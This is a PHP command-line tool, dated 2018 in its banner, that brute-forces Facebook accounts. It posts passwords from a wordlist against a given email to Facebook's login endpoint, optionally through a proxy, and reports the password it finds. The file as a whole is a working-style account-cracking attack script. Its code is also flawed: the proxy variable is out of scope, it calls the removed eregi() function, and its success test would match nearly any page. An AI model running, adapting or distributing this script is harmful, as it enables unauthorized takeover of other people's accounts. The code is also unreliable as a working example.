<?php

$rb="\033[31;1m";
$wb="\033[37;2m";
$dd="\033[32;1m";
$dc="\033[36;1m";

    error_reporting(0);
    banner();
    $email = $argv[1];
    $word = $argv[2];

	if(isset($argv[3]) && $argv[3] == "-proxy"){
		$proxys = $argv[4];
		$proxy = explode(":", $proxys);
		$sock = fsockopen($proxy[0], $proxy[1]);
		if(!$sock){
			echo "[-] Fatal...!!!";
			exit;
		}
	}
    function banner(){
system("clear");

echo "\033[31;1m
	┏━╸┏┓    ┏┓ ┏━┓╻ ╻╺┳╸┏━╸
	┣╸ ┣┻┓╺━╸┣┻┓┣┳┛┃ ┃ ┃ ┣╸
	╹  ┗━┛   ┗━┛╹┗╸┗━┛ ╹ ┗━╸
\033[31;1m        [----\033[37mAuthor  : GunadiCBR  \033[31;1m---------------->
\033[31;1m        [----\033[37mDate    : 15-10-2018                   \033[31m|-->
\033[31;1m        [----\033[37mVersion : 1.5                            \033[31m|-->
\033[31;1m        [----\033[37mGithub  : https://github.com/afelfgie  \033[31m|-->
\033[31;1m        [----\033[37mTeam    : Mls18hckr  \033[31m---------------->


\033[31m[+]usage : \033[37mphp facebook.php example@gmail.com wordlist.txt -proxy 127.0.0.1:80
\n\n";
	sleep(1);
    }
    function brute($usuario, $senha){

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
      curl_setopt($ch, CURLOPT_HEADER, false);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
      curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
      $source = curl_exec($ch);
      $fp = fopen("log.html", "w");
      fwrite($fp, $source);
      
      if(eregi("<title>", $source)){
        return true;
      }else{
        return false;
      }
    }
    if(isset($argv[1]) && isset($argv[2])){
      $lines = file($word);
      foreach($lines as $line){
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        if(brute($email, $line)){
          print "-----------------------------------------------------------------------\n\n";
          echo "[+] Facebook Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
          print "-------------------------------------------------------------------------\n";
          exit;
        }else{
          echo "[-] Facebook NOT Cracked -> " . "Email: " . $email . " Senha: " .$line . "\n";
        }
      }
    }else{
    	echo "[-] usage: php facebook.php example@gmail.com wordlist.txt
            [-] usage: php facebook.php example@gmail.com wordlist.txt -proxy 127.0.0.1:80\n";
    }
    
?>
